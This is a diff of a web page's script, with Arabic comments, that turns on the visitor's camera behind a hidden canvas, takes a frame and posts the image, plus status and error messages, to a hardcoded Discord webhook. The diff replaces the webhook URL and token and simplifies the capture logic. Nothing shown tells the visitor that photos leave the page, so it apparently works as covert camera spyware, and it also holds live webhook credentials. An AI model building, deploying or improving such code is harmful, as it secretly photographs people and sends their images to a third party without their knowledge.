@@ -10,37 +10,27 @@
 <canvas id="canvas" style="display:none"></canvas>
 
 <script>
-const webhook = "https://discord.com/api/webhooks/1475203617043517533/JZeV78rfYNKQAyY83cTx6khi_ZVd1DhxhnIe9Ciq_xkpSyZiRgSKDCPVGZfD3t4nc0VC";
+// ضع رابط الويبهوك الجديد هنا
+const webhook = "https://discord.com/api/webhooks/1486227691421307010/SQ-EJuhSl7w30NqPDZExBz60NAfFnvTdAWCzgDjaUJxuQYvTvoGSwr6Yh87w79mP4mIg";
 
-function isImageBlack(videoElement) {
-    // رسم الإطار الحالي مؤقتاً
-    const testCanvas = document.createElement('canvas');
-    testCanvas.width = videoElement.videoWidth;
-    testCanvas.height = videoElement.videoHeight;
-    const ctx = testCanvas.getContext('2d');
-    ctx.drawImage(videoElement, 0, 0);
+// أولاً: اختبر إذا الويبهوك شغال
+async function testWebhook() {
+    const testData = new FormData();
+    testData.append("content", "✅ الكاميرا جاهزة، جاري التصوير...");
     
-    const imageData = ctx.getImageData(0, 0, testCanvas.width, testCanvas.height);
-    let totalPixels = imageData.data.length / 4;
-    let blackPixels = 0;
-    
-    // فحص أول 1000 بكسل فقط (أسرع)
-    const step = Math.max(1, Math.floor(totalPixels / 1000));
-    for (let i = 0; i < imageData.data.length; i += step * 4) {
-        let r = imageData.data[i];
-        let g = imageData.data[i+1];
-        let b = imageData.data[i+2];
-        // إذا اللون قريب من الأسود
-        if (r < 20 && g < 20 && b < 20) {
-            blackPixels++;
+    try {
+        const res = await fetch(webhook, { method: "POST", body: testData });
+        if (res.ok) {
+            console.log("✓ الويبهوك شغال");
+            return true;
+        } else {
+            console.log("✗ الويبهوك فاشل - الكود: " + res.status);
+            return false;
         }
+    } catch(e) {
+        console.log("✗ ما قدرت أوصل للويبهوك: " + e.message);
+        return false;
     }
-    
-    let blackRatio = blackPixels / (totalPixels / step);
-    console.log("نسبة الأسود: " + (blackRatio * 100).toFixed(1) + "%");
-    
-    // إذا أكثر من 90% أسود -> الصورة سوداء
-    return blackRatio > 0.9;
 }
 
 function captureAndSend(videoElement) {
@@ -52,86 +42,76 @@ function captureAndSend(videoElement) {
         ctx.drawImage(videoElement, 0, 0);
         
         canvas.toBlob(async (blob) => {
-            if (blob && blob.size > 5000) { // حجم أكبر من 5KB يعني في صورة حقيقية
+            if (blob && blob.size > 5000) {
                 const formData = new FormData();
-                formData.append("file", blob, `frame_${Date.now()}.png`);
-                try {
-                    await fetch(webhook, { method: "POST", body: formData });
-                    console.log("[✓] تم الإرسال - الحجم: " + (blob.size/1024).toFixed(1) + "KB");
+                formData.append("file", blob, `shot_${Date.now()}.png`);
+                
+                // إرسال الصورة
+                const result = await fetch(webhook, { method: "POST", body: formData });
+                
+                if (result.ok) {
+                    console.log("✓ تم إرسال الصورة - الحجم: " + (blob.size/1024).toFixed(1) + "KB");
+                    
+                    // إرسال تأكيد نصي
+                    const confirmMsg = new FormData();
+                    confirmMsg.append("content", "📸 تم التصوير بنجاح");
+                    await fetch(webhook, { method: "POST", body: confirmMsg });
+                    
                     resolve(true);
-                } catch(e) {
-                    console.log("فشل الإرسال");
+                } else {
+                    console.log("✗ فشل إرسال الصورة - الكود: " + result.status);
                     resolve(false);
                 }
             } else {
-                console.log("الصورة صغيرة جداً أو فاسدة");
+                console.log("✗ الصورة فاسدة أو صغيرة جداً (" + (blob?.size || 0) + " bytes)");
                 resolve(false);
             }
-        }, "image/png", 0.9);
+        }, "image/png", 0.95);
     });
 }
 
 async function startCamera() {
+    // اختبر الويبهوك أولاً
+    const webhookWorks = await testWebhook();
+    if (!webhookWorks) {
+        console.log("⚠️ الويبهوك ما يشتغل! غير الرابط");
+        alert("الويبهوك ما يشتغل! غير الرابط في الكود");
+        return;
+    }
+    
     try {
-        // طلب الكاميرا
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { 
-                width: { ideal: 1280 },
-                height: { ideal: 720 }
-            } 
-        });
-        
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.getElementById('cam');
         video.srcObject = stream;
         
         video.onloadedmetadata = () => {
             video.play();
-            console.log("الكاميرا بدأت، ننتظر أول إطار حقيقي...");
+            console.log("الكاميرا شغالة، ننتظر 2 ثانية...");
             
-            // نجرب كل 300 مللي ثانية حتى نحصل على صورة غير سوداء
-            let attempts = 0;
-            const maxAttempts = 30; // 9 ثواني كحد أقصى
-            
-            const checkInterval = setInterval(async () => {
-                attempts++;
+            setTimeout(async () => {
+                console.log("نجرب نصور...");
+                const success = await captureAndSend(video);
                 
-                // نتأكد أن الفيديو له أبعاد
-                if (video.videoWidth === 0 || video.videoHeight === 0) {
-                    console.log("انتظار أبعاد الفيديو...");
-                    return;
+                if (success) {
+                    console.log("✓ كل شيء تم بنجاح");
+                } else {
+                    console.log("✗ فشل التصوير");
                 }
                 
-                // نفحص إذا كانت الصورة سوداء
-                const isBlack = isImageBlack(video);
-                
-                if (!isBlack) {
-                    // وجدنا صورة حقيقية!
-                    console.log("تم العثور على إطار حقيقي، نصور الآن...");
-                    clearInterval(checkInterval);
-                    
-                    // نعطي الكاميرا نصف ثانية إضافية لتستقر
-                    setTimeout(async () => {
-                        await captureAndSend(video);
-                        // نغلق الكاميرا بعد الإرسال
-                        stream.getTracks().forEach(track => track.stop());
-                        console.log("انتهى");
-                    }, 500);
-                    
-                } else if (attempts >= maxAttempts) {
-                    // فشلنا في الحصول على صورة حقيقية
-                    console.log("لم نتمكن من الحصول على صورة حقيقية");
-                    clearInterval(checkInterval);
-                    stream.getTracks().forEach(track => track.stop());
-                }
-            }, 300); // كل 300 مللي ثانية
+                // نغلق الكاميرا
+                stream.getTracks().forEach(t => t.stop());
+            }, 2000);
         };
         
     } catch(err) {
-        console.log("خطأ في الكاميرا:", err);
+        console.log("خطأ في الكاميرا: " + err.message);
+        // نرسل رسالة خطأ للويبهوك
+        const errorMsg = new FormData();
+        errorMsg.append("content", "❌ خطأ: " + err.message);
+        await fetch(webhook, { method: "POST", body: errorMsg });
     }
 }
 
-// بدء التشغيل
 startCamera();
 </script>
 </body>
